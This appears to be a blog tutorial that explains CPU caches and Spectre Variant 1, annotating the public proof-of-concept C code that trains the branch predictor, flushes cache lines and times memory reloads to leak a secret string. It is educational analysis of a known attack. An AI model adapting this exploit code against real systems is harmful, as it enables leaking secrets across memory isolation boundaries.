Title: Spectre V1
Date: 2019-4-21 10:01
Modified: 2019-4-21 10:01
Category: tutorial
Tags: spectre, cache
Slug: spectre_v1
Authors: F3real
Summary: How spectre V1 works

There are multiple spectre variants, but we will take look only at POC of V1 and try to understand it. But first, let's take a look at how CPU cache works:

[TOC]

##CPU cache

CPUs usually have 3 cache levels (L1, L2 and L3). Accessing a higher cache level takes longer (more latency).  There can also be different caches for memory and instructions for example: L1 data cache (d-cache) and L1 instruction cache (i-cache).
Data is transferred between memory and cache in blocks of fixed size, called `cache lines` or `cache blocks`. Cache line size is in power of 2 (usually between 16 and 128 bytes). `Cache set` is a 'row' in a cache containing multiple cache blocks depending on layout.

To map memory addresses to cache entry we split it into three different parts:

~~~text
          +---------------------------------------------------------+
          |       TAG        |      SET INDEX     |     OFFSET      |
          +---------------------------------------------------------+
~~~
Getting data from cache follows the following algorithm:

1. Use the `set index` to identify which cache set the address should reside in.
2. For cache, each block in the corresponding cache set, compare the `tag` associated with that block to the tag from the requested memory address. If there is a match, proceed to the next step. Otherwise, the data is not in the cache.
3. For the block where the data was found, look at a valid bit. If it is 1, the data is in the cache and we have a `cache hit`, otherwise it is not. 

`Offset` part of the request address is used to select a portion of the matching cache line.
If we fail to find data in the cache we have a `cache miss`. In this case, the procedure is repeated  to  attempt  to  retrieve  the  data  from  the  next  cache levels, and finally external memory.

If cache block size is `B` (B being smallest addressable unit), then we need b bits for `offset` part of address:

![Formula for calculating offset size]({static}/images/2019_4_23_equation1.svg){: .img-fluid .centerimage}

If `S` is the number of sets in our cache, then the `set index` has s bits:

![Formula for calculating set index size]({static}/images/2019_4_23_equation2.svg){: .img-fluid .centerimage}

Remaining bits are used for `tag`
.
If each set contains k lines then we say that the cache is k-way associative.
`Direct mapped` cache has one line in each set (1-way associative).
`Fully-associative` cache has only one set, and thus don't use set bits.

If the requested address is not found in the cache, then it will be brought in from memory along with the data near it (to take advantage of spatial locality) and placed there. To determine which addresses will also be brought in, we find the starting and ending address of the range that will be brought in. The starting address can be found by “zeroing out” the block offset part of the address. For the ending address, we replace the block offset with all 1’s. Note that the size of this range will always be the size of a cache block. The data in that range will be brought in and placed in one of the blocks in the cache.
If no blocks are free, some of the old data will be evicted from the cache to make space.

##Spectre V1

Spectre V1 is based on exploiting conditional branch misprediction.
Full spectre paper can be found [here](https://spectreattack.com/spectre.pdf).

In general spectre attacks use the fact that processor can speculatively   execute code that it shouldn't and even after the results of executing it are reverted, side effects of execution are left behind which can be exploited to leak data.

Branch prediction helps processors increase performance, but also makes processors speculatively execute code. Processors use Branch Target Buffer (BTB) which keeps  a  mapping  from  addresses  of  recently  executed branch instructions  to  destination  addresses to improve prediction.

For V1 attacker first starts with a training branch predictor so that it will make the wrong prediction later on. After this training phase attacker makes processor access out of bound value and load data to cache based on it. Measuring time to access data we can check what was loaded in the cache and leak it.

Let's look at POC:

First we have few defined global variables:

~~~c
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * 512]; /* 1 Mb */
const char * secret = "The Magic Words are Squeamish Ossifrage.";
~~~

Unused arrays serve as padding ensuring that data around them falls into different cache lines (L1 cache often has 64 byte lines). `Secret` array represents information we are trying to leak and `array1` represent memory attacker has access to (shared between the attacker and target). The size of `array1` is not important.

~~~c
uint8_t temp = 0; /* Used so compiler won’t optimize out victim_function() */
void victim_function(size_t x) {
	if (x < array1_size) {
		temp &= array2[array1[x] * 512];
	}
}
~~~

Victim function accesses memory based on attacker provided `x`. In case that
branch predictor makes the wrong prediction, the process will start executing `if` even with out-of-bounds `x`. This will load `array2[array1[x] * 512]` in the cache (in case of out-of-bounds `x`, value loaded in cache will depend on some secret byte `k`).

The attacker needs to make sure that `array1_size` and `array2` are uncached.
If `array1_size` is uncached, it will cause a delay in the evaluation of branch condition while the value is being fetched from memory. This delay can be substantial so instead of waiting for results to be determined, the processor will start executing code speculatively based on branch predictor (which is trained by an attacker to assume that branch is taken). Reading `array2[array1[x] * 512]` also takes time (due to cache miss). While this is happening processor may evaluate branch prediction, realise it made mistake and rewind state, but value loaded from `array2` will remain in the cache. The attacker needs to make sure `array2` was uncached so that he can deduce `k` based on what value was loaded in the cache.

We use `512` as array stride, this way we access different cache lines.

Next, we have `readMemoryByte` function which tries to leverage `victim_function` and leak secret data.

~~~c
/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
	static int results[256];
	int tries, i, j, k, mix_i, junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t * addr;

    /* Initialize result table*/
	for (i = 0; i < 256; i++)
		results[i] = 0;
	for (tries = 999; tries > 0; tries--) {

		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++)
			_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */

        /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = tries % array1_size;
		for (j = 29; j >= 0; j--) {
			_mm_clflush(&array1_size);
			for (volatile int z = 0; z < 100; z++) {} /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = ((j % 6) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
			x = training_x ^ (x & (malicious_x ^ training_x));

			/* Call the victim! */
			victim_function(x);

		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++) {
			mix_i = ((i * 167) + 13) & 255;
			addr = &array2[mix_i * 512];
			time1 = __rdtscp((unsigned int *)&junk); /* READ TIMER */
			junk = *addr; /* MEMORY ACCESS TO TIME */
			time2 = __rdtscp((unsigned int *)&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
				results[mix_i]++; /* cache hit - add +1 to score for this value */
		}

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
			}
			else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}
		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
	}
	results[0] ^= junk; /* use junk so code above won’t get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}
~~~

Let's look at some parts in more depth:

We start setting up the attack by clearing the entire `array2` from the cache. We use 256 as a number of values since that's covers all possible byte values. 

> _mm_clflush - Invalidate and flush the cache line that contains p from all levels of the cache hierarchy.

~~~c
for (i = 0; i < 256; i++)
    _mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
~~~

After this, we make call victim function 5 times with the correct index (making branch predictor think it will be taken next time as well). After the training part, we call the victim function with our `malicious_x` index. Before calls to the victim, we also flush `array1_size` which finishes setting up our attack.
We repeat this procedure a few times to increase confidence in our guess.

After this, we have the timing part. We access `array2` elements, time the access and if it's below the threshold we increase corresponding value in `results` array. The only exception is a value that we used to train branch predictor, which we skip (`array1[tries % array1_size]`). We access elements in pseudo-random order to avoid stride predictor. If access patterns follow stride, the processor can detect it and prefetch values which would ruin our results.

For measurement, we are using `__rdtscp` since it is pseudo-serializing (it waits until all previous instructions have executed and all previous loads are globally visible unlike `__rdtsc`) which makes it less likely to be executed out of order.

The rest of the function is not that interesting, we select two best results and return them.

This POC uses Flash + Reload trick to leak sensitive information, but we can also use Evict + Reload combo. Evict + Reload uses cache contention, instead of flushing cache we replace the memory by loading something else instead.


Slightly modified POC source code can be found [here](https://github.com/F3real/ctf_solutions/tree/master/2019/Spectre%20V1).
If you are interested in more about Spectre you can take a look at Chandler Carruth [talk](https://www.youtube.com/watch?v=_f7O3IfIR2k) from CppCon 2018.

